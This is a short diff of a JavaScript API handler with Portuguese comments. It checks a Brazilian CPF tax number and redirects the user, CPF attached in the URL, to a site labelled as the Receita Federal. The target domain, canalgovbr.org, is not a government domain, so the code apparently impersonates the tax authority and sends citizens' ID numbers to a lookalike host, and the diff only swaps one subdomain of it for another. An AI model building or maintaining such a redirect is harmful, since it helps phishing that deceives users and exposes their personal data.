@@ -31,7 +31,7 @@ export default async function handler(req, res) {
     const cpf = req.query.cpf;
     // Validar se o CPF tem 11 dígitos
     if (/^\d{11}$/.test(cpf)) {
-      const receitaUrl = `https://receita.canalgovbr.org/${cpf}`;
+      const receitaUrl = `https://receita-federal.canalgovbr.org/${cpf}`;
       console.log('Redirecionando CPF para Receita Federal:', receitaUrl);
       return res.redirect(307, receitaUrl);
     } else {
